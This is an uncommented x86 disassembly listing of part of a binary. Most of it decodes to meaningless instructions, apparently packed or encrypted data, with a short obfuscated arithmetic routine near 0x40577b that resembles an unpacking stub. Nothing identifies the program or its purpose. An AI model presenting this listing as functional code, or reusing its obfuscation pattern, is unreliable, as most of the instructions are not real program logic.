  40522b:	cli    
  40522c:	pop    eax
  40522d:	hlt    
  40522e:	pop    es
  40522f:	je     0x4051eb
  405231:	jnp    0x4051c9
  405233:	lahf   
  405234:	mov    dh,0x39
  405236:	or     dl,BYTE PTR [edi-0x52]
  405239:	fadd   DWORD PTR [esi]
  40523b:	jmp    0x4051f0
  40523d:	fsubrp st(2),st
  40523f:	psubq  mm6,QWORD PTR [edi]
  405242:	jg     0x4051f0
  405244:	sub    BYTE PTR [ecx],0x31
  405247:	jae    0x4052a7
  405249:	les    esp,FWORD PTR [edx+0x67]
  40524c:	stos   DWORD PTR es:[edi],eax
  40524d:	sub    BYTE PTR [ebx],0x54
  405250:	inc    esp
  405251:	(bad)  
  405253:	add    BYTE PTR [ebp+0x22],al
  405256:	jg     0x405253
  405258:	and    DWORD PTR [ebp-0x5e],edi
  40525b:	add    cl,dh
  40525d:	(bad)  
  40525e:	fld    DWORD PTR [ebx+0x8]
  405261:	adc    esi,DWORD PTR ds:0x1baf907e
  405267:	mov    DWORD PTR [ecx],0xc74b15b4
  40526d:	adc    DWORD PTR [esi+0x28],esi
  405270:	pmulhuw mm2,QWORD PTR [eax+ebx*4]
  405274:	cdq    
  405275:	jle    0x405242
  405277:	inc    edx
  405278:	mov    dh,0xe1
  40527a:	loope  0x4052dc
  40527c:	mov    esp,0xd8abaed5
  405281:	lods   al,BYTE PTR ds:[esi]
  405282:	cli    
  405283:	xchg   ecx,eax
  405284:	loope  0x405288
  405286:	(bad)  
  405287:	mov    ds:0xe80d4b34,al
  40528c:	mov    bh,0x8
  40528e:	pushf  
  40528f:	fdivr  QWORD PTR [ecx]
  405291:	add    bl,ch
  405293:	inc    ebx
  405294:	jmp    0x405240
  405296:	ficom  WORD PTR [ebx+edx*4-0x3f6285d7]
  40529d:	out    dx,eax
  40529e:	inc    ecx
  40529f:	sub    eax,0xdd731e68
  4052a4:	imul   ebp,DWORD PTR [esi],0xbe39bb42
  4052aa:	stos   DWORD PTR es:[edi],eax
  4052ab:	xchg   BYTE PTR [esi+0x3c99ea63],dh
  4052b1:	lock arpl si,sp
  4052b4:	dec    esp
  4052b5:	push   edx
  4052b6:	pushf  
  4052b7:	dec    edi
  4052b8:	cmp    DWORD PTR [edx],eax
  4052ba:	gs mov al,0x97
  4052bd:	cli    
  4052be:	add    edx,DWORD PTR [ecx]
  4052c0:	sub    dh,BYTE PTR [ebp-0x4c]
  4052c3:	push   ds
  4052c4:	retf   
  4052c5:	imul   eax,ebp,0xffffffaf
  4052c8:	mov    eax,ds:0xaefc4054
  4052cd:	and    ebx,DWORD PTR ss:[eax+eax*1-0x6c20d8bd]
  4052d5:	cwde   
  4052d6:	sbb    eax,0x78c9e19e
  4052db:	iret   
  4052dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052dd:	cmc    
  4052de:	(bad)  
  4052e0:	out    dx,al
  4052e1:	ret    0x758b
  4052e4:	fld    DWORD PTR [ebx-0x39]
  4052e7:	sahf   
  4052e8:	push   edx
  4052e9:	push   0xcba4d4a9
  4052ee:	retf   
  4052ef:	ret    0x85f9
  4052f2:	call   0x14a1abba
  4052f7:	add    BYTE PTR [edx+0x5f],dl
  4052fa:	xlat   BYTE PTR ds:[ebx]
  4052fb:	call   0x15306112
  405300:	xchg   DWORD PTR [ebx],edi
  405302:	pop    ebx
  405303:	imul   ebx,ebp,0x6d
  405306:	xchg   ebx,eax
  405307:	mov    ds:0xe372b51d,al
  40530c:	mov    cl,0x6d
  40530e:	sub    ah,BYTE PTR [ebp+0x3f54d7ef]
  405314:	adc    ah,BYTE PTR [edx+0x3d4b6bf7]
  40531a:	cmp    eax,0xe613a308
  40531f:	je     0x4052da
  405321:	jp     0x405316
  405323:	ret    0xed41
  405326:	jae    0x4052d3
  405328:	xor    al,0x84
  40532a:	pop    es
  40532b:	mov    eax,ds:0x439841b2
  405330:	adc    eax,0xd9ad913f
  405335:	sub    eax,0x9ad09367
  40533a:	imul   ecx,DWORD PTR [ebp+0x41],0x36aa1375
  405341:	not    DWORD PTR [ebx]
  405343:	ss pop esi
  405345:	out    dx,al
  405346:	xlat   BYTE PTR ds:[ebx]
  405347:	mov    DWORD PTR [edx],ecx
  405349:	sar    DWORD PTR ds:0xbdc54176,1
  40534f:	pop    ds
  405350:	push   ds
  405351:	popa   
  405352:	ds push 0x5b
  405355:	jl     0x4053a1
  405357:	mov    ds:0xbce2a800,al
  40535c:	test   DWORD PTR [eax-0x7b],edx
  40535f:	addr16 mov ds:0xa53f,al
  405363:	clc    
  405364:	mov    esp,DWORD PTR [edx+0x18]
  405367:	mov    edi,DWORD PTR [edi-0x67]
  40536a:	fwait
  40536b:	add    BYTE PTR [ecx],bh
  40536d:	(bad)  
  40536e:	jle    0x4053b3
  405370:	dec    edx
  405371:	pop    ds
  405372:	test   DWORD PTR [edi+edi*4-0x50],esp
  405376:	in     eax,dx
  405377:	daa    
  405378:	ret    
  405379:	fsub   DWORD PTR [edi-0x69]
  40537c:	or     eax,0x171d1e0
  405381:	mov    ?,WORD PTR [edi]
  405383:	in     eax,0xbe
  405385:	mov    gs:0xf76b4134,eax
  40538b:	add    DWORD PTR [eax+0x3c],0x3a
  40538f:	outs   dx,BYTE PTR ds:[esi]
  405390:	mov    dl,0x24
  405392:	xor    edi,edi
  405394:	sub    dh,cl
  405396:	dec    edi
  405397:	dec    ebx
  405398:	dec    edi
  405399:	jmp    0x6cc0:0x146d66fa
  4053a0:	pop    esp
  4053a1:	mul    DWORD PTR [eax+0x25]
  4053a4:	pop    ds
  4053a5:	int3   
  4053a6:	lahf   
  4053a7:	sub    BYTE PTR ds:[ebx],al
  4053aa:	mov    bl,0x10
  4053ac:	xchg   ebx,eax
  4053ad:	mov    ebx,0xc5cb4ca8
  4053b2:	xchg   edi,eax
  4053b3:	sbb    eax,DWORD PTR [esi+0x5b]
  4053b6:	add    BYTE PTR [edx+0x59],0x16
  4053ba:	mov    eax,0x57c92d08
  4053bf:	(bad)  
  4053c1:	enter  0xbac5,0x29
  4053c5:	mov    ds:0x4f226609,al
  4053ca:	sbb    cl,BYTE PTR [edi-0x25f8654b]
  4053d0:	std    
  4053d1:	lea    esp,[esi+edi*4-0x58f77393]
  4053d8:	sbb    eax,0xbbe2f931
  4053dd:	retf   0xd48e
  4053e0:	add    eax,DWORD PTR [edi*2+0x253bfb3a]
  4053e7:	inc    ecx
  4053e8:	or     BYTE PTR [edi-0x171b7a9e],dh
  4053ee:	cwde   
  4053ef:	call   0xecb6db84
  4053f4:	fidiv  WORD PTR [ebx]
  4053f6:	adc    ebp,esi
  4053f8:	lods   eax,DWORD PTR ds:[esi]
  4053f9:	xchg   edx,eax
  4053fa:	pusha  
  4053fb:	iret   
  4053fc:	sub    DWORD PTR [esi-0x7e],edx
  4053ff:	cli    
  405400:	jb     0x405393
  405402:	stc    
  405403:	je     0x40542b
  405405:	js     0x405438
  405407:	xlat   BYTE PTR ds:[ebx]
  405408:	fist   WORD PTR ds:0xa1373ce2
  40540e:	adc    bh,BYTE PTR [eax+0x33]
  405411:	jmp    0xe7984a73
  405416:	mov    ebp,0x9ce2b35a
  40541b:	jnp    0x7d56b9d3
  405421:	pop    edx
  405422:	pop    fs
  405424:	fdivr  QWORD PTR [esi-0x782721b]
  40542a:	scas   eax,DWORD PTR es:[edi]
  40542b:	xor    eax,DWORD PTR [esi+0x50f26828]
  405431:	push   ebp
  405432:	hlt    
  405433:	sbb    al,0xd1
  405435:	pop    es
  405436:	jle    0x4053f6
  405438:	test   DWORD PTR [edx-0x4e],edx
  40543b:	enter  0xbd4,0xa3
  40543f:	bound  eax,QWORD PTR [eax-0x55d509c7]
  405445:	cdq    
  405446:	xchg   edi,eax
  405447:	cld    
  405448:	inc    ebp
  405449:	adc    DWORD PTR [edi+esi*1-0x9],ebp
  40544d:	mov    DWORD PTR [edi],esp
  40544f:	ficomp WORD PTR [eiz*1+0x612f57f5]
  405456:	nop
  405457:	pop    eax
  405458:	rcr    ch,0x93
  40545b:	add    bh,ah
  40545d:	std    
  40545e:	imul   ebx,DWORD PTR [esi],0xffffffc4
  405461:	test   eax,0xffa3b27
  405466:	xchg   BYTE PTR [ebp-0xa],dl
  405469:	(bad)  
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x6051fbb8]
  405484:	pop    ebp
  405485:	sub    edx,eax
  405487:	sub    edi,DWORD PTR [esi+0x7e]
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x405417
  40548f:	mul    esi
  405491:	retf   0x9500
  405494:	aam    0x21
  405496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405497:	call   0x4dad:0xce90193
  40549e:	rcr    DWORD PTR [edi+0x29],0x9c
  4054a2:	push   edx
  4054a3:	cdq    
  4054a4:	arpl   dx,cx
  4054a6:	xor    DWORD PTR [edx-0x1e],0x84c6557e
  4054ad:	mov    edi,0xab86b72f
  4054b2:	stc    
  4054b3:	inc    eax
  4054b4:	adc    eax,0xf5525a98
  4054b9:	jg     0x405521
  4054bb:	or     BYTE PTR [esi],0x51
  4054be:	(bad)  
  4054bf:	fxch   st(1)
  4054c1:	xchg   edx,eax
  4054c2:	or     BYTE PTR [ecx+ecx*4+0x5d],ch
  4054c6:	shl    DWORD PTR [eax+0x70],1
  4054c9:	in     al,dx
  4054ca:	dec    edx
  4054cb:	xor    ah,bl
  4054cd:	jge    0x4054ab
  4054cf:	mov    al,ds:0xb8ffa53a
  4054d4:	push   esp
  4054d5:	pop    edi
  4054d6:	mov    dh,0x69
  4054d8:	mov    dl,0xf3
  4054da:	es ret 0x35f9
  4054de:	mov    bh,0xfa
  4054e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054e1:	fidivr WORD PTR [esp+eiz*8+0x6a800c0d]
  4054e8:	ds cmp al,0x18
  4054ec:	mov    al,0x4d
  4054ee:	push   esi
  4054ef:	jmp    DWORD PTR [ebp+0xddf4ff5]
  4054f5:	pop    ss
  4054f6:	aam    0x30
  4054f8:	lea    eax,[ecx-0x4d]
  4054fb:	loopne 0x405541
  4054fd:	scas   al,BYTE PTR es:[edi]
  4054fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ff:	bound  edi,QWORD PTR [edx]
  405501:	adc    eax,0xebf46766
  405506:	ss mov bl,0x6b
  405509:	cmp    al,0x14
  40550b:	mov    ?,esp
  40550d:	repz xchg ebp,eax
  40550f:	pop    edx
  405510:	fist   DWORD PTR [ecx]
  405512:	pop    ecx
  405513:	in     al,0x2e
  405515:	arpl   bp,cx
  405517:	xchg   DWORD PTR [ecx],ecx
  405519:	fnop   
  40551b:	dec    eax
  40551c:	xchg   ecx,eax
  40551d:	jae    0x405552
  40551f:	les    ebx,FWORD PTR [ebx]
  405521:	push   cs
  405522:	into   
  405523:	mov    dl,0xfc
  405525:	jl     0x405586
  405527:	add    eax,0x15e7ec32
  40552c:	retf   
  40552d:	stos   BYTE PTR es:[edi],al
  40552e:	cmp    edi,0x1a
  405531:	xchg   ecx,eax
  405532:	pop    ebp
  405533:	or     al,0x2
  405535:	add    al,0x7e
  405537:	stc    
  405538:	arpl   WORD PTR [esi+0xb],cx
  40553b:	mov    ecx,0xe1f937ca
  405540:	loope  0x4054df
  405542:	aas    
  405543:	xor    ecx,DWORD PTR [ebx-0x57835137]
  405549:	or     al,0x89
  40554b:	xchg   ebx,eax
  40554c:	rcl    ecx,1
  40554e:	push   ss
  40554f:	pop    ss
  405550:	ds into 
  405552:	lea    edi,[edi+0x73990bf9]
  405558:	mov    ecx,0xef230036
  40555d:	jno    0x40555a
  40555f:	xor    al,0x30
  405561:	mov    ecx,0x1dd743b0
  405566:	fwait
  405567:	jmp    0xaf06f127
  40556c:	pop    edx
  40556d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556e:	into   
  40556f:	cmc    
  405570:	(bad)  
  405571:	and    ebp,DWORD PTR [eax*1-0x6c19f32]
  405578:	fistp  WORD PTR [edx+0x54]
  40557b:	pop    ds
  40557c:	inc    eax
  40557d:	rcl    DWORD PTR [edi],1
  40557f:	jg     0x4055ed
  405581:	(bad)  
  405582:	jmp    0xf63f:0xe76c2382
  405589:	ror    ch,cl
  40558b:	add    BYTE PTR [eax+0xe],bh
  40558e:	inc    ebp
  40558f:	lock mov esp,0xf8d72db5
  405595:	jnp    0x405601
  405597:	sbb    ecx,esp
  405599:	or     cl,BYTE PTR [esi]
  40559b:	adc    esp,DWORD PTR [ebx]
  40559d:	pop    es
  40559e:	xchg   esp,eax
  40559f:	pushf  
  4055a0:	in     al,0xd5
  4055a2:	mov    al,0x8b
  4055a4:	std    
  4055a5:	xchg   ebp,eax
  4055a6:	xchg   edi,eax
  4055a7:	dec    esi
  4055a8:	push   eax
  4055a9:	mov    dh,0xb5
  4055ab:	sub    ebp,0xc3d283c4
  4055b1:	xchg   ebx,eax
  4055b2:	sbb    dl,ah
  4055b4:	sub    DWORD PTR [ebx+esi*1],edi
  4055b7:	push   esp
  4055b8:	add    edi,DWORD PTR [esi+edx*1+0x16]
  4055bc:	sub    eax,0xf18fb24f
  4055c1:	jecxz  0x405602
  4055c3:	fwait
  4055c4:	icebp  
  4055c5:	adc    eax,DWORD PTR [edi-0x67]
  4055c8:	shr    DWORD PTR [ebp-0x73],0x44
  4055cc:	gs and ecx,edi
  4055cf:	fld    TBYTE PTR [edi-0x7ce9a8ff]
  4055d5:	inc    ebx
  4055d6:	xlat   BYTE PTR ds:[ebx]
  4055d7:	ret    0xeb45
  4055da:	popw   ds
  4055dc:	and    eax,0x5f33f734
  4055e1:	pop    ds
  4055e2:	jnp    0x40558f
  4055e4:	mov    edi,ebp
  4055e6:	adc    al,0xf
  4055e8:	pushf  
  4055e9:	ja     0x4055b8
  4055eb:	stos   DWORD PTR es:[edi],eax
  4055ec:	dec    ebx
  4055ed:	les    ecx,FWORD PTR [ebx]
  4055ef:	pop    edx
  4055f0:	rcl    ch,1
  4055f2:	mov    ah,0x6a
  4055f4:	and    ebp,esi
  4055f6:	lea    edx,[ecx-0x21]
  4055f9:	xor    esp,DWORD PTR [ebx]
  4055fb:	and    ebp,DWORD PTR [ebx-0x35aa9492]
  405601:	xchg   DWORD PTR [ebx],ebp
  405603:	mov    dh,0x99
  405605:	shr    BYTE PTR [eax+edx*1],cl
  405608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405609:	mov    cs,WORD PTR [edx+edi*8-0x53cc7740]
  405610:	(bad)  
  405611:	lods   al,BYTE PTR ds:[esi]
  405612:	sub    eax,0x7d99e961
  405617:	ja     0x4055ee
  405619:	cmp    DWORD PTR [edx-0x7dae5d03],ebx
  40561f:	sbb    ch,BYTE PTR [esp+ebx*2+0x5b]
  405623:	mov    dl,0xc8
  405625:	mov    dl,0x27
  405627:	mov    cl,0xe7
  405629:	imul   esp,DWORD PTR [edi-0x3e],0x3b
  40562d:	sbb    BYTE PTR [ecx],ch
  40562f:	js     0x405603
  405631:	ror    edi,cl
  405633:	call   0x669e:0x67ab317
  40563a:	popf   
  40563b:	xchg   ecx,ebx
  40563d:	clc    
  40563e:	sbb    eax,0xd57cf982
  405643:	out    0xb6,eax
  405645:	call   0x4f7e73ec
  40564a:	jne    0x40561c
  40564c:	push   ecx
  40564d:	adc    al,0x25
  40564f:	sub    DWORD PTR [esp+edi*8+0x6dfffe4d],0x7a0de5b5
  40565a:	je     0x405621
  40565c:	mov    eax,ds:0x85b1d94f
  405661:	in     al,0xad
  405663:	mov    ds:0xa1c73d23,al
  405668:	mov    ecx,DWORD PTR [ecx+0x44a7b071]
  40566e:	loop   0x40568b
  405670:	pop    ecx
  405671:	cmp    eax,DWORD PTR [eax-0x54]
  405674:	out    dx,al
  405675:	loope  0x405650
  405677:	dec    ebx
  405678:	(bad)  
  40567a:	ret    
  40567b:	popa   
  40567c:	mov    edi,ebx
  40567e:	icebp  
  40567f:	dec    ebp
  405680:	ins    DWORD PTR es:[edi],dx
  405681:	dec    ecx
  405682:	jb     0x40564c
  405684:	and    esi,DWORD PTR [esi]
  405686:	cli    
  405687:	mov    edx,0xc91bbee7
  40568c:	lahf   
  40568d:	mov    ch,0xaf
  40568f:	ins    DWORD PTR es:[edi],dx
  405690:	mov    dl,0x28
  405692:	dec    edx
  405693:	mov    eax,0xe4fb8013
  405698:	pop    edi
  405699:	enter  0x9b4c,0xb
  40569d:	pop    es
  40569e:	adc    eax,0x355455b4
  4056a3:	cmp    BYTE PTR [edi+0x13519d07],ah
  4056a9:	stos   DWORD PTR es:[edi],eax
  4056aa:	popa   
  4056ab:	jl     0x405693
  4056ad:	outs   dx,BYTE PTR ds:[esi]
  4056ae:	push   edi
  4056af:	jae    0x4056b5
  4056b1:	jp     0x405699
  4056b3:	and    edx,DWORD PTR [esi-0x26631fb]
  4056b9:	adc    DWORD PTR ds:0xc34f0956,eax
  4056bf:	cmp    ch,BYTE PTR es:[ecx]
  4056c2:	scas   eax,DWORD PTR es:[edi]
  4056c3:	arpl   WORD PTR [esi-0x22],si
  4056c6:	aas    
  4056c7:	cmp    bh,BYTE PTR [edi-0x2f59115d]
  4056cd:	dec    ecx
  4056ce:	sbb    DWORD PTR ds:0x91833b91,esi
  4056d4:	sub    DWORD PTR [edx+ebx*2],esi
  4056d7:	mov    bh,0xbd
  4056d9:	ret    
  4056da:	iret   
  4056db:	dec    esp
  4056dc:	shr    BYTE PTR [ebx+0x51],cl
  4056df:	dec    ecx
  4056e0:	fadd   st,st(1)
  4056e2:	mov    ebx,0x9ecfe2f
  4056e7:	xchg   ecx,eax
  4056e8:	mov    ebp,0x27276d43
  4056ed:	fnsave [esi+esi*8-0x13]
  4056f1:	cmp    al,0x9a
  4056f3:	clc    
  4056f4:	xchg   ebx,eax
  4056f5:	xchg   ebp,eax
  4056f6:	push   ecx
  4056f7:	addr16 inc ebx
  4056f9:	js     0x405694
  4056fb:	lods   eax,DWORD PTR ds:[esi]
  4056fc:	pop    edi
  4056fd:	and    DWORD PTR [edx-0x18],ebp
  405700:	pop    es
  405701:	pop    eax
  405702:	pop    es
  405703:	(bad)  
  405704:	scas   eax,DWORD PTR es:[edi]
  405705:	out    0xee,al
  405707:	sub    al,0xb5
  405709:	out    0x68,eax
  40570b:	int3   
  40570c:	loopne 0x405786
  40570e:	sub    DWORD PTR [eax-0x2f4597eb],esp
  405714:	je     0x405790
  405716:	xor    ch,BYTE PTR [eax+0x112830e2]
  40571c:	scas   eax,DWORD PTR es:[edi]
  40571d:	jl     0x40575e
  40571f:	mov    esi,0x2bc2d6e2
  405724:	nop
  405725:	cld    
  405726:	fs mov ebp,0x61bee008
  40572c:	test   edi,edx
  40572e:	call   0x7d46b4c6
  405733:	mov    bh,0xb0
  405735:	sbb    al,0xdd
  405737:	popa   
  405738:	int    0xf5
  40573a:	lea    ecx,[eax-0x6d2db6e7]
  405740:	adc    al,0x66
  405742:	dec    ecx
  405743:	dec    ecx
  405744:	jb     0x40575e
  405746:	push   edx
  405747:	or     ecx,DWORD PTR ds:[ecx+0x6b5538bb]
  40574e:	mov    esi,0xd91f0c8e
  405753:	mov    bl,0x74
  405755:	or     al,0xd4
  405757:	xchg   ecx,eax
  405758:	adc    ch,BYTE PTR [ebp+0x16]
  40575b:	jns    0x4057b1
  40575d:	pop    ss
  40575e:	cwde   
  40575f:	int    0x8b
  405761:	cwde   
  405762:	movaps XMMWORD PTR [edi+eax*4-0x55e86fbb],xmm0
  40576a:	loop   0x405727
  40576c:	arpl   WORD PTR [esi+0x72],cx
  40576f:	jbe    0x4057c8
  405771:	jbe    0x40577e
  405773:	mov    WORD PTR [ebx],?
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x9
  4057f5:	sbb    bl,dl
  4057f7:	test   eax,0x7e7e363a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	mov    ds:0xde4e81c8,al
  405805:	(bad)  
  405807:	test   BYTE PTR [ecx+0x36],dh
  40580a:	js     0x4057da
  40580c:	or     DWORD PTR [ecx-0x2517cf6a],ecx
  405812:	call   0x34724604
  405817:	popf   
  405818:	gs push ds
  40581a:	std    
  40581b:	pop    DWORD PTR [esi+ebx*8+0x4b]
  40581f:	sub    DWORD PTR [eax-0x2f],ebp
  405822:	xor    eax,DWORD PTR [edx]
  405824:	mov    WORD PTR [esi-0x18f9b172],ds
  40582a:	imul   BYTE PTR [ebx-0x12]
  40582d:	test   BYTE PTR [ebx-0x6a],bh
  405830:	pop    ecx
  405831:	sti    
  405832:	xor    al,BYTE PTR [ecx]
  405834:	mov    DWORD PTR [ebp-0x3572853a],edx
  40583a:	lds    esp,FWORD PTR ds:0xe1e532
  405840:	retf   0x89e9
  405843:	and    edi,DWORD PTR [ecx]
  405845:	stos   DWORD PTR es:[edi],eax
  405846:	out    dx,eax
  405847:	push   0xffffffd0
  405849:	stc    
  40584a:	(bad)  
  40584b:	dec    esp
  40584c:	fsub   QWORD PTR [edi-0x3e]
  40584f:	push   ebp
  405850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405851:	mov    ecx,0x20ccbb81
  405856:	and    al,0x82
  405858:	push   cs
  405859:	clc    
  40585a:	outs   dx,BYTE PTR ds:[esi]
  40585b:	in     al,dx
  40585c:	fiadd  DWORD PTR [edx+eiz*2-0x271b1b89]
  405863:	mov    ecx,0x1305bea9
  405868:	lods   eax,DWORD PTR ds:[esi]
  405869:	sbb    al,0xc0
  40586b:	xor    BYTE PTR [ebp-0x32],dl
  40586e:	sti    
  40586f:	cdq    
  405870:	sbb    al,0x4d
  405872:	loop   0x4058f2
  405874:	dec    ebx
  405875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405876:	push   edi
  405877:	shl    DWORD PTR ds:0x85a110f3,0xa0
  40587e:	push   es
  40587f:	adc    al,0x36
  405881:	adc    ah,dh
  405883:	xor    al,0x63
  405885:	fucomp st(2)
  405887:	mov    ebp,0x3475c97
  40588c:	and    BYTE PTR [edx-0x41],bh
  40588f:	jo     0x405868
  405891:	sbb    dh,al
  405893:	pop    ebx
  405894:	test   al,0xf4
  405896:	jmp    0x405818
  405898:	ret    0x3fc2
  40589b:	inc    ebp
  40589c:	scas   eax,DWORD PTR es:[edi]
  40589d:	mov    edx,0x896ad242
  4058a2:	mov    eax,0x63e8876
  4058a7:	mov    bh,0xeb
  4058a9:	jno    0x405914
  4058ab:	cwde   
  4058ac:	ins    DWORD PTR es:[edi],dx
  4058ad:	push   edx
  4058ae:	dec    edx
  4058af:	inc    edx
  4058b0:	aas    
  4058b1:	into   
  4058b2:	fabs   
  4058b4:	aam    0x1
  4058b6:	stos   DWORD PTR es:[edi],eax
  4058b7:	lahf   
  4058b8:	inc    eax
  4058b9:	push   cs
  4058ba:	sbb    BYTE PTR [ecx],0x49
  4058bd:	cwde   
  4058be:	or     ebp,DWORD PTR [ebx]
  4058c0:	mov    esi,0x996f4b08
  4058c5:	loopne 0x4058d0
  4058c7:	lds    edx,FWORD PTR [edi]
  4058c9:	leave  
  4058ca:	mov    ch,0xf8
  4058cc:	dec    di
  4058ce:	inc    edi
  4058cf:	mov    ah,0xa4
  4058d1:	add    dh,dl
  4058d3:	push   esi
  4058d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d5:	fsub   QWORD PTR [edx-0x5c]
  4058d8:	in     eax,0xf2
  4058da:	ja     0x405898
  4058dc:	idiv   DWORD PTR ds:0x2142da08
  4058e2:	dec    edx
  4058e3:	pop    ebx
  4058e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058e5:	call   0x9c84:0x9038acf
  4058ec:	or     BYTE PTR [edx+0x2dc7f2c5],bh
  4058f2:	xchg   ebx,eax
  4058f3:	ja     0x405902
  4058f5:	ss pop ds
  4058f7:	push   ecx
  4058f8:	popa   
  4058f9:	mov    ebx,0x8638ace9
  4058fe:	jg     0x405887
  405900:	sub    bh,BYTE PTR [edx+0x19dca8cd]
  405906:	mov    edx,0x3395f9e0
  40590b:	pop    edi
  40590c:	add    bh,BYTE PTR [eax+0x53]
  40590f:	inc    eax
  405910:	add    BYTE PTR [ecx+0x18],ah
  405913:	mov    fs,ebp
  405915:	out    0xeb,al
  405917:	mov    dh,0x79
  405919:	div    ebx
  40591b:	push   0xffffffb1
  40591d:	addr16 push ds
  40591f:	push   0x7b
  405921:	push   edx
  405922:	mov    ch,0xa9
  405924:	outs   dx,DWORD PTR ds:[esi]
  405925:	aad    0xb4
  405927:	or     esp,edx
  405929:	xor    al,0xb9
  40592b:	mov    eax,DWORD PTR [ebx-0x7b598bff]
  405931:	fs dec ebp
  405933:	in     al,dx
  405934:	or     eax,0x3942f851
  405939:	inc    ebx
  40593a:	in     al,dx
  40593b:	adc    DWORD PTR [ebp-0x66c338c0],esp
  405941:	div    DWORD PTR [edx-0x2f8b76c8]
  405947:	retf   0xc24c
  40594a:	and    bh,bh
  40594c:	repz sbb al,0xfe
  40594f:	mov    ?,WORD PTR [esi+0x3c]
  405952:	xchg   esp,eax
  405953:	pop    ecx
  405954:	jns    0x405988
  405956:	pop    esp
  405957:	cmp    al,0x87
  405959:	adc    DWORD PTR [edi],ebx
  40595b:	jno    0x40594c
  40595d:	dec    eax
  40595e:	shr    al,cl
  405960:	cmp    BYTE PTR [ecx+0x18ade568],dl
  405966:	or     bh,BYTE PTR ds:0xf5ff3e06
  40596c:	inc    edx
  40596d:	push   ebx
  40596e:	js     0x405974
  405970:	test   eax,0x6a41d764
  405975:	adc    cl,BYTE PTR [esi-0x80]
  405978:	in     al,0x2e
  40597a:	sub    esp,ebx
  40597c:	outs   dx,BYTE PTR ds:[esi]
  40597d:	lods   al,BYTE PTR ds:[esi]
  40597e:	in     eax,dx
  40597f:	rol    BYTE PTR [esi],0x9e
  405982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405984:	fdiv   st(6),st
  405986:	in     al,0x8f
  405988:	mov    ebx,edi
  40598a:	sub    ebx,DWORD PTR [ebp+0x63a2821b]
  405990:	scas   al,BYTE PTR es:[edi]
  405991:	xor    eax,0x39b3776e
  405996:	push   cs
  405997:	push   ecx
  405998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405999:	ficom  DWORD PTR [ebx]
  40599b:	xor    al,0xb1
  40599d:	inc    edx
  40599e:	or     al,0xf4
  4059a0:	test   edx,0x6183b2a
  4059a6:	xchg   esp,eax
  4059a7:	pop    ds
  4059a8:	aam    0xe5
  4059aa:	sti    
  4059ab:	outs   dx,BYTE PTR ds:[esi]
  4059ac:	dec    edi
  4059ad:	popf   
  4059ae:	mov    bh,0x2b
  4059b0:	jae    0x4059e1
  4059b2:	fstp   st(1)
  4059b4:	adc    BYTE PTR [edx],bl
  4059b6:	mov    WORD PTR [eax-0x5ee4aab1],?
  4059bc:	mov    al,0x75
  4059be:	and    DWORD PTR [ebx-0x4a01421b],edx
  4059c4:	jae    0x405a36
  4059c6:	aam    0x0
  4059c8:	mov    dl,0x9f
  4059ca:	xor    DWORD PTR [ebp-0x47],esp
  4059cd:	in     eax,0x3a
  4059cf:	ja     0x405a24
  4059d1:	out    dx,eax
  4059d2:	and    BYTE PTR ds:0x87328e8f,dl
  4059d8:	add    DWORD PTR [ebx-0x6d],edx
  4059db:	mov    eax,ds:0x96e45ab9
  4059e0:	je     0x405a1d
  4059e2:	jge    0x40597f
  4059e4:	int3   
  4059e5:	dec    edi
  4059e6:	push   eax
  4059e7:	jo     0x405a39
  4059e9:	xchg   ebx,eax
  4059ea:	loope  0x405a30
  4059ec:	in     al,dx
  4059ed:	dec    edi
